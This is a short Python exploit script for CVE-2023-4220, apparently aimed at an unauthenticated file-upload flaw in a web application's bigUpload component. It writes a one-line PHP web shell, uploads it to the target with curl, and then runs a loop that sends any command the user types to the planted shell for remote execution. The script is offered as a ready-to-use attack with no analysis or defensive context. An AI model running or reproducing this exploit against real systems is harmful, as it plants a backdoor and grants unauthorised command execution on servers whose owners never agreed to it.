#!/usr/bin/python3

import pyfiglet
import os
import sys
from colorama import init
from termcolor import colored

intro = colored(pyfiglet.figlet_format("CVE-2023-4220", font="slant"), 'red')

print(intro)

# Create WebShell

os.system('echo \'<?php system($_GET["jiji"]);  ?>\' > jiji.php')

# Get variables

target_url = input('Enter Target_URL: ')
target_port = input('Enter Target_Port: ')
# rce = input('RCE_Command: ')

# Upload WebShell

file_upload = "curl -F 'bigUploadFile=@jiji.php' 'http://{0}:{1}/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'".format(target_url, target_port)

res = os.system(file_upload)

if res != 0:
	print(colored('Upload failed', 'green', 'on_red'))
	sys.exit()

print("\n")

print(colored('The file has successfully been uploaded.', 'green', 'on_red'))


# Trigger WebShell

while True:
	rce = input('RCE_Command: ')
	if rce.lower() in ["exit", "quit"]:
		break

	os.system("curl 'http://{0}/main/inc/lib/javascript/bigupload/files/jiji.php?jiji={1}'".format(target_url, rce))
